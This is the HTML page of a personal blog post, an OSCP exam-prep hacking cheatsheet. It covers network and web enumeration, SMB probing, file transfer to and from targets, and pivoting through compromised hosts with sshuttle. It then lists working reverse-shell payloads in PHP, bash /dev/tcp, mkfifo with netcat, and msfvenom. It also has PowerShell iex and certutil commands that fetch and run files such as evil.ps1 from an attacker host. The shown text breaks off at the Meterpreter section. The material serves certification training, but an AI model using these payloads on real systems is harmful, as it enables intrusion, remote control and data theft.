<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="ie=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="author" content="ceso ">
<meta name="description" content="Hacking/OSCP Cheatsheet Well, just finished my 90 days journey of OSCP labs, so now here is my cheatsheet of it (and of hacking itself), I will be adding stuff in an incremental way as I go having time and/or learning new stuff. But this is basically the tools I tend to relie and use in this way the most. Hope is helpfull for you!
Enumeration Network discoverie Nmap I tend to run 3 nmaps, an initial one, a full one and an UDP one, all of them in parallel:" />
<meta name="keywords" content="CTF, Security, HTB, blog, infosec, blog, cheatsheet, hacking, linux, windows, exfiltration, privilegeescalation" />
<meta name="robots" content="noodp" />
<meta name="theme-color" content="#252627" />
<link rel="canonical" href="https://ceso.github.io/posts/2020/04/hacking/oscp-cheatsheet/" />


    <title>
        
            Hacking/OSCP cheatsheet :: Ceso Adventures 
        
    </title>



<link href="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.2.1/css/flag-icon.min.css" rel="stylesheet"
    type="text/css">



<link rel="stylesheet" href="https://ceso.github.io/main.min.5dcefbf8102eb536dd3e2de53ffebfa58599ab2435c241a0db81728a5e015f2e.css">


    
        <link rel="stylesheet" type="text/css" href="https://ceso.github.io/css/scroll.css">
    



    <link rel="apple-touch-icon" sizes="180x180" href="https://ceso.github.io/apple-touch-icon.png">
    <link rel="icon" type="image/png" sizes="32x32" href="https://ceso.github.io/favicon-32x32.png">
    <link rel="icon" type="image/png" sizes="16x16" href="https://ceso.github.io/favicon-16x16.png">
    <link rel="manifest" href="https://ceso.github.io/site.webmanifest">
    <link rel="mask-icon" href="https://ceso.github.io/safari-pinned-tab.svg" color="#252627">
    <link rel="shortcut icon" href="https://ceso.github.io/favicon.ico">
    <meta name="msapplication-TileColor" content="#252627">
    <meta name="theme-color" content="#252627">

<meta itemprop="name" content="Hacking/OSCP cheatsheet">
<meta itemprop="description" content="My humble cheatsheet of most used tools, webs, etc">
<meta itemprop="datePublished" content="2020-04-07T02:30:30&#43;00:00" />
<meta itemprop="dateModified" content="2020-04-07T02:30:30&#43;00:00" />
<meta itemprop="wordCount" content="1667">
<meta itemprop="image" content="https://ceso.github.io/images/cheatsheet/banner.jpg">



<meta itemprop="keywords" content="blog,cheatsheet,hacking,linux,windows,exfiltration,privilegeescalation," /><meta name="twitter:card" content="summary_large_image"/>
<meta name="twitter:image" content="https://ceso.github.io/images/cheatsheet/banner.jpg"/>

<meta name="twitter:title" content="Hacking/OSCP cheatsheet"/>
<meta name="twitter:description" content="My humble cheatsheet of most used tools, webs, etc"/>





    <meta property="article:published_time" content="2020-04-07 02:30:30 &#43;0000 UTC" />








    </head>

    <body class="dark-theme">
        <div class="container">
            <header class="header">
    <span class="header__inner">
        <a href="https://ceso.github.io/" style="text-decoration: none;">
    <div class="logo">
        
            <span class="logo__mark">></span>
            <span class="logo__text">ceso@hogsmeade$ </span>
            <span class="logo__cursor" style=
                  "
                   background-color:#808080;
                   ">
            </span>
        
    </div>
</a>


        <span class="header__right">
            
                <nav class="menu">
    <ul class="menu__inner"><li><a href="https://ceso.github.io/about/">About</a></li><li><a href="https://ceso.github.io/posts/2020/04/hacking/oscp-cheatsheet/">Cheatsheet</a></li><li><a href="https://ceso.github.io/posts/">Posts</a></li><li><a href="https://ceso.github.io/tags/">Tags</a></li>
    </ul>
</nav>

                <span class="menu-trigger">
                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
                        <path d="M0 0h24v24H0z" fill="none"/>
                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
                    </svg>
                </span>
            

            <span class="theme-toggle unselectable"><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
  <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
  3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
</svg>
</span>
        </span>
    </span>
</header>


            <div class="content">
                
  
  

  <div class="post">

    <div class="post-info">
      <p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-clock"><circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline></svg>8 minutes

        

      </p>
    </div>

    <h2 class="post-title"><a href="https://ceso.github.io/posts/2020/04/hacking/oscp-cheatsheet/">Hacking/OSCP cheatsheet</a></h2>
    <div class="post-meta">
      
        <span class="post-date">
          2020-04-07
        </span>

        
          
        
      

      
      
    </div>

    
      <span class="post-tags">
        
          #<a href="https://ceso.github.io/tags/blog/">blog</a>&nbsp;
        
          #<a href="https://ceso.github.io/tags/cheatsheet/">cheatsheet</a>&nbsp;
        
          #<a href="https://ceso.github.io/tags/hacking/">hacking</a>&nbsp;
        
          #<a href="https://ceso.github.io/tags/linux/">linux</a>&nbsp;
        
          #<a href="https://ceso.github.io/tags/windows/">windows</a>&nbsp;
        
          #<a href="https://ceso.github.io/tags/exfiltration/">exfiltration</a>&nbsp;
        
          #<a href="https://ceso.github.io/tags/privilegeescalation/">privilegeescalation</a>&nbsp;
        
      </span>
    

    

    <div class="post-content"><div id="TableOfContents">
<ul>
    

    
    <li>
      <a href="#hackingoscp-cheatsheet">Hacking/OSCP Cheatsheet</a>
    

    
    <ul>
            <li>
          <a href="#enumeration">Enumeration</a>
    

    
    <ul>
            <li>
          <a href="#network-discoverie">Network discoverie</a>
    

    
    <ul>
            <li>
          <a href="#nmap">Nmap</a>
    

    
    </li></ul></li><li>
          <a href="#ports-discovery-without-nmap">Ports discovery (without nmap)</a>
    

    
    <ul>
            <li>
          <a href="#nc--bash">nc + bash</a>
    

    
    </li><li>
          <a href="#devtcpipport-or-devudpipport">/dev/tcp/ip/port or /dev/udp/ip/port</a>
    

    
    </li></ul></li><li>
          <a href="#banner-grabbing-without-nmap">Banner grabbing (without nmap)</a>
    

    
    <ul>
            <li>
          <a href="#devtcpipport-or-devudpipport-1">/dev/tcp/ip/port or /dev/udp/ip/port</a>
    

    
    </li><li>
          <a href="#telnet">telnet</a>
    

    
    </li></ul></li><li>
          <a href="#web-directoriefile-scanner">Web directorie/file scanner</a>
    

    
    <ul>
            <li>
          <a href="#gobuster">Gobuster</a>
    

    
    </li><li>
          <a href="#nikto">Nikto</a>
    

    
    </li><li>
          <a href="#fuff">fuff</a>
    

    
    </li></ul></li><li>
          <a href="#samba">Samba</a>
    

    
    <ul>
            <li>
          <a href="#smbclient">smbclient</a>
    

    
    </li><li>
          <a href="#impacket">impacket</a>
    

    
    </li><li>
          <a href="#smbmap">smbmap</a>
    

    
    </li><li>
          <a href="#version-nmap-didnt-detect-it">Version (nmap didn&rsquo;t detect it)</a>
    

    
    </li></ul></li></ul></li><li>
          <a href="#exfiltration">Exfiltration</a>
    

    
    <ul>
            <li>
          <a href="#samba-1">Samba</a>
    

    
    <ul>
            <li>
          <a href="#mount-in-windows">Mount in Windows</a>
    

    
    </li><li>
          <a href="#mount-in-linux">Mount in Linux</a>
    

    
    </li></ul></li><li>
          <a href="#http">HTTP</a>
    

    
    <ul>
            <li>
          <a href="#download-from-windows">Download from Windows</a>
    

    
    </li><li>
          <a href="#download-from-linux">Download from Linux</a>
    

    
    </li></ul></li><li>
          <a href="#ftp">FTP</a>
    

    
    </li><li>
          <a href="#sockets">Sockets</a>
    

    
    </li><li>
          <a href="#rdp">RDP</a>
    

    
    </li></ul></li><li>
          <a href="#pivoting">Pivoting</a>
    

    
    <ul>
            <li>
          <a href="#sshuttle">sshuttle</a>
    

    
    <ul>
            <li>
          <a href="#one-hop">One hop</a>
    

    
    </li><li>
          <a href="#multi-hops">Multi-hops</a>
    

    
    </li></ul></li></ul></li><li>
          <a href="#reverse-shells">Reverse shells</a>
    

    
    <ul>
            <li>
          <a href="#php">php</a>
    

    
    </li><li>
          <a href="#bash">bash</a>
    

    
    </li><li>
          <a href="#sh--nc">sh + nc</a>
    

    
    </li><li>
          <a href="#perl-example-deploy-as-cgi-bin">Perl (example deploy as cgi-bin)</a>
    

    
    </li><li>
          <a href="#java-example-to-deploy-on-tomcat">Java (example to deploy on tomcat)</a>
    

    
    </li><li>
          <a href="#meterpreter-shell">Meterpreter shell</a>
    

    
    <ul>
            <li>
          <a href="#windows-staged-reverse-tcp">Windows staged reverse TCP</a>
    

    
    </li><li>
          <a href="#windows-stageless-reverse-tcp">Windows stageless reverse TCP</a>
    

    
    </li><li>
          <a href="#linux-staged-reverse-tcp">Linux staged reverse TCP</a>
    

    
    </li><li>
          <a href="#linux-staged-reverse-tcp-1">Linux staged reverse TCP</a>
    

    
    </li></ul></li></ul></li><li>
          <a href="#usefull-links">Usefull links</a>
    

    
    <ul>
            <li>
          <a href="#privilege-escalation">Privilege escalation</a>
    

    
    <ul>
            <li>
          <a href="#linux">Linux</a>
    

    
    </li><li>
          <a href="#windows">Windows</a>
    

    
    </li></ul></li><li>
          <a href="#misc">Misc</a>
    

    
    <ul>
            <li>
          <a href="#windows-1">Windows</a>
    

    
    </li><li>
          <a href="#linux-1">Linux</a>
    

    
    </li></ul></li><li>
          <a href="#brute-force">Brute force</a>
    

    
    </li><li>
          <a href="#compiling-exploits">Compiling exploits</a>
  </li></ul></li></ul></li></ul>
</div><h1 id="hackingoscp-cheatsheet">Hacking/OSCP Cheatsheet</h1>
<p>Well, just finished my 90 days journey of OSCP labs, so now here is my cheatsheet of it (and of hacking itself), I will be adding stuff in an incremental way as I go having time and/or learning new stuff.
But this is basically the tools I tend to relie and use in this way the most.
Hope is helpfull for you!</p>
<h2 id="enumeration">Enumeration</h2>
<h3 id="network-discoverie">Network discoverie</h3>
<h4 id="nmap">Nmap</h4>
<p>I tend to run 3 nmaps, an initial one, a full one and an UDP one, all of them in parallel:</p>
<pre><code class="language-console" data-lang="console">nmap -sV -O --top-ports 50 --open -oA nmap/initial &lt;ip or cidr&gt;
nmap -sC -sV -O --open -p- -oA nmap/full &lt;ip or cidr&gt;
nmap -sU -p- -oA nmap/udp &lt;ip or cidr&gt;

--top-ports only scan the N most common ports
--open only show open ports
-sC use the default scripts
-sV detect versions
-O detect Operating Systems
-p- scan all the ports
-oA save the output in normal format, grepable and xml
-sU scan UDP ports
</code></pre><p>Is also possible to specify scripts or ports:</p>
<pre><code class="language-console" data-lang="console">nmap --scripts vuln,safe,discovery -p 443,80 &lt;ip or cidr&gt;
</code></pre><p>If there are servers that could be not answering (ping), then add the flag -Pn (example of initial one):</p>
<pre><code class="language-console" data-lang="console">nmap -Pn --top-ports 50 --open -oA nmap/initial &lt;ip or cidr&gt;
</code></pre><h3 id="ports-discovery-without-nmap">Ports discovery (without nmap)</h3>
<h4 id="nc--bash">nc + bash</h4>
<p>If you get in a machine that doesn&rsquo;t has nmap installed, you can do a basic discovery of (for example), top 20 ports open in 192.168.30 by doing:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">top10<span style="color:#f92672">=</span><span style="color:#f92672">(</span><span style="color:#ae81ff">20</span> <span style="color:#ae81ff">21</span> <span style="color:#ae81ff">22</span> <span style="color:#ae81ff">23</span> <span style="color:#ae81ff">25</span> <span style="color:#ae81ff">80</span> <span style="color:#ae81ff">110</span> <span style="color:#ae81ff">139</span> <span style="color:#ae81ff">443</span> <span style="color:#ae81ff">445</span> 3389<span style="color:#f92672">)</span>; <span style="color:#66d9ef">for</span> i in <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">${</span>top10[@]<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>; <span style="color:#66d9ef">do</span> nc -w <span style="color:#ae81ff">1</span> 192.168.30.253 $i <span style="color:#f92672">&amp;&amp;</span> echo <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">Port </span>$i<span style="color:#e6db74"> is open</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">||</span> echo <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">Port </span>$i<span style="color:#e6db74"> is closed or filtered</span><span style="color:#e6db74">&#34;</span>; <span style="color:#66d9ef">done</span>
</code></pre></div><h4 id="devtcpipport-or-devudpipport">/dev/tcp/ip/port or /dev/udp/ip/port</h4>
<p>Alternatively, is possible to do the same than above but by using the special dev files <code>/dev/tcp/ip/port</code> or <code>/dev/udp/ip/port</code> (for example nc is not found):</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">top10<span style="color:#f92672">=</span><span style="color:#f92672">(</span><span style="color:#ae81ff">20</span> <span style="color:#ae81ff">21</span> <span style="color:#ae81ff">22</span> <span style="color:#ae81ff">23</span> <span style="color:#ae81ff">25</span> <span style="color:#ae81ff">80</span> <span style="color:#ae81ff">110</span> <span style="color:#ae81ff">139</span> <span style="color:#ae81ff">443</span> <span style="color:#ae81ff">445</span> 3389<span style="color:#f92672">)</span>; <span style="color:#66d9ef">for</span> i in <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">${</span>top10[@]<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>; <span style="color:#66d9ef">do</span> <span style="color:#f92672">(</span>echo &gt; /dev/tcp/192.168.30.253/<span style="color:#e6db74">&#34;</span>$i<span style="color:#e6db74">&#34;</span><span style="color:#f92672">)</span> &gt; /dev/null 2&gt;&amp;<span style="color:#ae81ff">1</span> <span style="color:#f92672">&amp;&amp;</span> echo <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">Port </span>$i<span style="color:#e6db74"> is open</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">||</span> echo <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">Port </span>$i<span style="color:#e6db74"> is closed</span><span style="color:#e6db74">&#34;</span>; <span style="color:#66d9ef">done</span>
</code></pre></div><p>Taking these last  examples, is straightforward to create a dummy script for scan a hole /24 net (for example):</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e">#!/bin/bash
</span><span style="color:#75715e"></span>subnet<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;192.168.30&#34;</span>
top10<span style="color:#f92672">=</span><span style="color:#f92672">(</span><span style="color:#ae81ff">20</span> <span style="color:#ae81ff">21</span> <span style="color:#ae81ff">22</span> <span style="color:#ae81ff">23</span> <span style="color:#ae81ff">25</span> <span style="color:#ae81ff">80</span> <span style="color:#ae81ff">110</span> <span style="color:#ae81ff">139</span> <span style="color:#ae81ff">443</span> <span style="color:#ae81ff">445</span> 3389<span style="color:#f92672">)</span>
<span style="color:#66d9ef">for</span> host in range <span style="color:#f92672">{</span>1..255<span style="color:#f92672">}</span>; <span style="color:#66d9ef">do</span>
    <span style="color:#66d9ef">for</span> port in <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">${</span>top10[@]<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>; <span style="color:#66d9ef">do</span>
        <span style="color:#f92672">(</span>echo &gt; /dev/tcp/<span style="color:#e6db74">&#34;</span><span style="color:#e6db74">${</span>subnet<span style="color:#e6db74">}</span><span style="color:#e6db74">.</span><span style="color:#e6db74">${</span>host<span style="color:#e6db74">}</span><span style="color:#e6db74">/</span><span style="color:#e6db74">${</span>port<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">)</span> &gt; /dev/null 2&gt;&amp; <span style="color:#f92672">&amp;&amp;</span> echo <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">Host </span><span style="color:#e6db74">${</span>subnet<span style="color:#e6db74">}</span><span style="color:#e6db74">.</span><span style="color:#e6db74">${</span>host<span style="color:#e6db74">}</span><span style="color:#e6db74"> has </span><span style="color:#e6db74">${</span>port<span style="color:#e6db74">}</span><span style="color:#e6db74"> open</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">||</span> <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">Host </span><span style="color:#e6db74">${</span>subnet<span style="color:#e6db74">}</span><span style="color:#e6db74">.</span><span style="color:#e6db74">${</span>host<span style="color:#e6db74">}</span><span style="color:#e6db74"> has </span><span style="color:#e6db74">${</span>port<span style="color:#e6db74">}</span><span style="color:#e6db74"> closed</span><span style="color:#e6db74">&#34;</span>
    <span style="color:#66d9ef">done</span>
<span style="color:#66d9ef">done</span>
</code></pre></div><h3 id="banner-grabbing-without-nmap">Banner grabbing (without nmap)</h3>
<p>If nmap didn&rsquo;t grab banners (or is not installed), you can do it with <code>/dev/tcp/ip/port</code> <code>/dev/udp/ip/port</code> or by using telnet.</p>
<h4 id="devtcpipport-or-devudpipport-1">/dev/tcp/ip/port or /dev/udp/ip/port</h4>
<pre><code class="language-console" data-lang="console">cat &lt; /dev/tcp/192.168.30.253/22
SSH-2.0-OpenSSH_6.2p2 Debian-6
^C pressed here
</code></pre><p>For doing it with udp ports is the same, but changing tcp for udp</p>
<h4 id="telnet">telnet</h4>
<pre><code class="language-console" data-lang="console">telnet 192.168.30.253 22
SSH-2.0-OpenSSH_6.2p2 Debian-6
^C pressed here
</code></pre><h3 id="web-directoriefile-scanner">Web directorie/file scanner</h3>
<h4 id="gobuster">Gobuster</h4>
<p>Scan all the directories/files by extension:</p>
<pre><code class="language-console" data-lang="console">Syntax: gobuster dir -u http://&lt;ip or hostname&gt; -w /path/to/dictionary -x &lt;extension, extension&gt; -o webscan/gobuster
Example: gobuster dir -u http://192.168.24.24 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php,txt,py -o webscan/gobuster-extensions
</code></pre><p>For scanning without extensions, just take out the -x</p>
<h4 id="nikto">Nikto</h4>
<p>Sometimes Nikto shows juicy information, I tend to run it like:</p>
<pre><code class="language-console" data-lang="console">Syntax: nikto -Format txt -o webscan/nikto-initial -host http://&lt;hostname or ip&gt; -p &lt;port&gt;
Example: nikto -Format txt -o webscan/nikto-initial -host http://192.168.24.24 -p 8080
</code></pre><h4 id="fuff">fuff</h4>
<p>Web fuzzer, <a href="https://github.com/ffuf/ffuf">you can get fuff here</a>, it basically bruteforces the dirs.</p>
<pre><code class="language-console" data-lang="console">Syntax: ffuf -w /path/to/wordlist -u http://&lt;ip or hostname/FUZZ
Example: ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u http://192.168.24.24/FUZZ
</code></pre><h3 id="samba">Samba</h3>
<h4 id="smbclient">smbclient</h4>
<p>Check if there is anonymous login enabled:</p>
<pre><code class="language-console" data-lang="console">Syntax: smbclient -L &lt;ip or hostname&gt;
Example: smbclient -L 192.168.24.24
</code></pre><h4 id="impacket">impacket</h4>
<p>Is also possible to use impacket in the same way than smbclient to check for anonymous login (and a lot more as browse the shares) in case of incompatible versions.</p>
<pre><code class="language-console" data-lang="console">Syntax: /usr/share/doc/python3-impacket/examples/smbclient.py &lt;username&gt;@&lt;ip or hostname&gt;
Example: /usr/share/doc/python3-impacket/examples/smbclient.py &quot;&quot;@192.168.24.24
</code></pre><h4 id="smbmap">smbmap</h4>
<p>Check which permissions we have in those shares (if there are):</p>
<pre><code class="language-console" data-lang="console">Syntax: smbmap -H &lt;ip or hostname&gt;
Example: smbmap -H 192.168.24.24

If we have a user, will be like the following:
smbmap -u &lt;username&gt; -H &lt;ip or hostname&gt;
</code></pre><h4 id="version-nmap-didnt-detect-it">Version (nmap didn&rsquo;t detect it)</h4>
<p>Sometimes nmap doesn&rsquo;t show the version of Samba in the remote host, if this happens, a good way to know which version the remote host is running, is to capture traffic with wireshark against the remote host on 445/139 and in parallel run an smbclient -L, do a follow tcp stream and with this we might see which version the server is running.

    <img src="https://ceso.github.io/images/cheatsheet/smb-version-wireshark.png"  class="center"  style="border-radius: 8px;"  />

</p>
<h2 id="exfiltration">Exfiltration</h2>
<h3 id="samba-1">Samba</h3>
<p>Generate a samba server with Impacket:</p>
<pre><code class="language-console" data-lang="console">Syntax: impacket-smbserver &lt;share-name&gt; &lt;path-to-share&gt;
Example: impacket-smbserver tools /home/kali/tools
</code></pre><h4 id="mount-in-windows">Mount in Windows</h4>
<p>Mounting it in Windows with Powershell:</p>
<pre><code class="language-console" data-lang="console">Syntax: New-PSDrive -Name &lt;share-name&gt; -PSProvider &quot;Filesystem&quot; -Root &lt;\\ip-hare\share-name&gt;&quot;
Example: New-PSDrive -Name &quot;tools&quot; -PSProvider &quot;Filesystem&quot; -Root &quot;\\192.168.42.42\tools&quot;
</code></pre><p>Mounting it without Powershell:</p>
<pre><code class="language-console" data-lang="console">Syntax: net use &lt;letterdisk&gt; &lt;\\ip-share\share-name&gt;
Example: net use z: \\192.168.42.42\tools&quot;
</code></pre><p>On windows, to list mounted shares, either Powershell or without it:</p>
<pre><code class="language-console" data-lang="console">Powershell: Get-SMBShare
Without Powershell: net share
</code></pre><h4 id="mount-in-linux">Mount in Linux</h4>
<p>Is needed to have installed cifs-utils, to install it (in debian based):</p>
<pre><code class="language-console" data-lang="console">sudo apt-get install cifs-utils
</code></pre><p>To mount it:</p>
<pre><code class="language-console" data-lang="console">Syntax: sudo mount -t cifs //ip-share/share-name /path/to/mount
Example: sudo mount -t cifs //192.168.42.42/tools ~/my_share/
</code></pre><p>To list mounted shares:</p>
<pre><code class="language-console" data-lang="console">mount | grep cifs
grep cifs /proc/mount
</code></pre><h3 id="http">HTTP</h3>
<p>From your local attacker machine, create a http server with:</p>
<pre><code class="language-console" data-lang="console">sudo python3 -m http.server 80
sudo python2 -m SimpleHTTPServer 80
</code></pre><p>It&rsquo;s also possible to specify which path to share, for example:</p>
<pre><code class="language-console" data-lang="console">sudo python3 -m http.server 80 --dir /home/kali/tools
</code></pre><h4 id="download-from-windows">Download from Windows</h4>
<p>There are two ways to download the files, with Powershell or without, those are with Powershell:</p>
<pre><code class="language-console" data-lang="console">Syntax: iex(new-object net.webclient).downloadstring(&quot;http://&lt;hostname or ip&gt;/path/is/the/file&quot;)
Example&quot; iex(new-object net.webclient).downloadstring(&quot;http://192.168.42.42/evil.ps1)
</code></pre><p>Without powershell</p>
<pre><code class="language-console" data-lang="console">Syntax: certutil.exe -urlcache -split -f &quot;http://&lt;hostname or ip&gt;/path/to/file&quot; name-save-file
Example: certutil.exe -urlcache -split -f &quot;http://192.168.42.42/nc.exe&quot; nc.exe
</code></pre><h4 id="download-from-linux">Download from Linux</h4>
<p>There way more ways than in windows, so I will just put 1 using curl, you can look for example at wget for alternative ways:</p>
<pre><code class="language-console" data-lang="console">Syntax: curl http://&lt;hostname or ip&gt;/path/to/file --output name-of-file
Example: curl http://192.168.42.42/evil.php --output evil.php
</code></pre><h3 id="ftp">FTP</h3>
<p>If there is an ftp server which we have access, we can upload files there through it, the syntax is the same for both, windows or linux:</p>
<pre><code class="language-console" data-lang="console">Connect and login with:
Syntax: ftp ip
Example: ftp 192.168.42.42
</code></pre><p>Upload the files with:</p>
<pre><code class="language-console" data-lang="console">Syntax: put &lt;file&gt;
Example: put evil.py

Sometimes is needed to enter in passive mode before doing anything, if is the case, just type
pass
followed by enter
</code></pre><h3 id="sockets">Sockets</h3>
<p>Using nc/ncat is possible to create as a listener to upload/download stuff through them, the syntax for nc and ncat is basically the same.
Create the socket with:</p>
<pre><code class="language-console" data-lang="console">Syntax: nc -lvnp &lt;port&gt; &lt; file-to-upload
Example: nc -lvnp 443 &lt; evil.php

For both cases from windows, the only difference is to write nc.exe
</code></pre><p>And download it with:</p>
<pre><code class="language-console" data-lang="console">Syntax: nc -v &lt;ip&gt; &lt;port&gt; &gt; file-to-download
Example: nc -v 192.168.42.42 443 &gt; evil.php
</code></pre><h3 id="rdp">RDP</h3>
<p>If we have access to a windows machine with a valid user/credentials and this user is in the &ldquo;Remote Desktop Users&rdquo;, we can share a local directorie as a mount volume through rdp itself once we connect to the machine:</p>
<pre><code class="language-console" data-lang="console">Syntax: rdesktop -g &lt;resolution&gt; -r disk:&lt;name-share&gt;=&lt;local path dir. to share&gt; &lt;ip or hostname&gt; -u &lt;username&gt; -p -
Example: rdesktop -g 1600x800 -r disk:tmp=/usr/share/windows-binaries 192.168.30.30 -u pelota -p -
</code></pre><h2 id="pivoting">Pivoting</h2>
<p>It&rsquo;s possible to do pivoting by using proxychains, pure nc&rsquo;s or in case of linux just some fifo files (I will write them down this another methods down maybe in a future), I have used during all the OSCP an awesome tool called (sshuttle)[https://github.com/sshuttle/sshuttle] (it&rsquo;s a transparent proxy server that works like &ldquo;a vpn&rdquo;, and doesn&rsquo;t require with super rights, only thing needed is that the bastion server you will use, needs to have installed python) and sometimes some SSH Forwarding. Something worth to mention nmap doesn&rsquo;t work through sshuttle.</p>
<h3 id="sshuttle">sshuttle</h3>
<h4 id="one-hop">One hop</h4>
<p>Let&rsquo;s say we are in an intranet and we have compromised a firewall that gives us access to the management net (fw.example.mgmt - ips 192.168.20.35 and 192.168.30.253 as the management ip), by using sshuttle we can create a &ldquo;vpn&rdquo; to talk directly to those servers, for that, we use:</p>
<pre><code class="language-console" data-lang="console">Syntax: sshuttle user@&lt;ip&gt;:&lt;port if not 22&gt; &lt;cidr-remote-net&gt;
Example: sshuttle ceso@192.168.20.35 192.168.30.0/24
</code></pre><h4 id="multi-hops">Multi-hops</h4>
<p>Now imagine that after we broke up into the management net after some some enumeration, we ended to compromise a machine that has also access to a production environment (foreman.example.mgmt - ips 192.168.30.40 and 192.168.25.87), we can take advantage of sshuttle + ProxyCommand of ssh to create a &ldquo;vpn&rdquo; through this multiple hops, so&hellip;putting it down, this will be kind of as follow (the diagram is extremly simplified and just for the sake of illustrate this visually, so it doesn&rsquo;t intend to provide a 100% precise network diagram):

    <img src="https://ceso.github.io/images/cheatsheet/multiple-hop-sshuttle.png"  class="center"  style="border-radius: 8px;"  />


To have that working, is needed to put the next conf in your ssh conf file (normally ~/.ssh/config. It&rsquo;s based on the example above, but is easy to extrapolate to different scenarios):</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">Host fw.example.mgmt
  Hostname 192.168.20.35
  User userOnFw
  IdentityFile ~/.ssh/priv_key_fw
Host foreman.example.mgmt
  Hostname 192.168.30.40
  User root
  ProxyJump fw.example.mgmt
  IdentityFile ~/.ssh/priv_key_internal
</code></pre></div><p>And now to setup the &ldquo;multiple hop vpn&rdquo;, run:</p>
<pre><code class="language-console" data-lang="console">sshuttle -r foreman.example.mgmt -v 192.168.25.0/24 &amp;

Later on is possible to connect from the local machine:
ssh foo@192.168.25.74
</code></pre><h2 id="reverse-shells">Reverse shells</h2>
<h3 id="php">php</h3>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#75715e">&lt;?php</span> $sock <span style="color:#f92672">=</span> <span style="color:#a6e22e">fsockopen</span>(<span style="color:#e6db74">&#34;192.168.42.42&#34;</span>,<span style="color:#e6db74">&#34;443&#34;</span>); $proc <span style="color:#f92672">=</span> <span style="color:#a6e22e">proc_open</span>(<span style="color:#e6db74">&#34;/bin/sh -i&#34;</span>, <span style="color:#66d9ef">array</span>(<span style="color:#ae81ff">0</span><span style="color:#f92672">=&gt;</span>$sock, <span style="color:#ae81ff">1</span><span style="color:#f92672">=&gt;</span>$sock, <span style="color:#ae81ff">2</span><span style="color:#f92672">=&gt;</span>$sock), $pipes); <span style="color:#75715e">?&gt;</span>
</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">php -r &#39;$sock=fsockopen(&#34;192.168.42.42&#34;,443);exec(&#34;/bin/sh -i <span style="color:#960050;background-color:#1e0010">&lt;</span><span style="color:#960050;background-color:#1e0010">&amp;</span>3 &gt;<span style="color:#960050;background-color:#1e0010">&amp;</span>3 2&gt;&amp;3&#34;);&#39;
</code></pre></div><h3 id="bash">bash</h3>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">bash -i &gt;&amp; /dev/tcp/192.168.42.42/443 0&gt;&amp;<span style="color:#ae81ff">1</span>
</code></pre></div><h3 id="sh--nc">sh + nc</h3>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2&gt;&amp;<span style="color:#ae81ff">1</span> | nc 192.168.42.42 <span style="color:#ae81ff">443</span> &gt;/tmp/f
</code></pre></div><h3 id="perl-example-deploy-as-cgi-bin">Perl (example deploy as cgi-bin)</h3>
<pre><code class="language-console" data-lang="console">msfvenom -p cmd/unix/reverse_perl LHOST=&quot;192.168.42.42&quot; LPORT=443 -f raw -o reverse_shell.cgi
</code></pre><h3 id="java-example-to-deploy-on-tomcat">Java (example to deploy on tomcat)</h3>
<pre><code class="language-console" data-lang="console">msfvenom -p java/shell_reverse_tcp LHOST=192.168.42.42 LPORT=443 -f war  rev_shell.war
</code></pre><h3 id="meterpreter-shell">Meterpreter shell</h3>
<h4 id="windows-staged-reverse-tcp">Windows staged reverse TCP</h4>
